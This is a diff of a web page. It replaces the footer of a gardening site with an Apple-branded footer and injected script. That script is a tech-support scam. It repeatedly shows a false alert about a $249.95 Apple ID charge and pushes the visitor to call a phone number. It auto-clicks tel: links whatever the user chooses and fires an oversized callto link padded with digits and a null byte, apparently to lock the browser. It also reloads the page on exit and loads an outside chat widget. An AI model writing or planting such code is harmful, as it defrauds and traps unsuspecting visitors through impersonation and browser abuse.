-                <div class="shed-tools">
-                    <span>📋 Guides</span>
-                    <span>📊 Charts</span>
-                    <span>📅 Planner</span>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
                 </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="site-footer">
-        <div class="container">
-            <div class="footer-principles">
-                <a href="#">Read the Fairmoss Principles</a>
-            </div>
-            <div class="footer-links">
-                <div>
-                    <h4>Pavilion</h4>
-                    <ul>
-                        <li><a href="#">About</a></li>
-                        <li><a href="#">Contact</a></li>
-                        <li><a href="#">Authors</a></li>
-                        <li><a href="#">Archive</a></li>
-                    </ul>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
                 </div>
-                <div>
-                    <h4>Resources</h4>
-                    <ul>
-                        <li><a href="#">FAQ</a></li>
-                        <li><a href="#">Sitemap</a></li>
-                        <li><a href="#">Glossary</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Policy</h4>
-                    <ul>
-                        <li><a href="#">Privacy Policy</a></li>
-                        <li><a href="#">Terms & Conditions</a></li>
-                        <li><a href="#">Cookie Policy</a></li>
-                        <li><a href="#">Disclaimer</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h4>Connect</h4>
-                    <ul>
-                        <li><a href="#">Instagram</a></li>
-                        <li><a href="#">Pinterest</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <span>© 2025 Fairmoss Thorn Pavilion</span>
-                <span>Editorial Policy</span>
-            </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-877-481-2925
+			 " property="telephone">
+            </section>
         </div>
     </footer>
 
-</body>
-</html>
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-481-2925');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-877-481-2925"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-877-481-2925 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
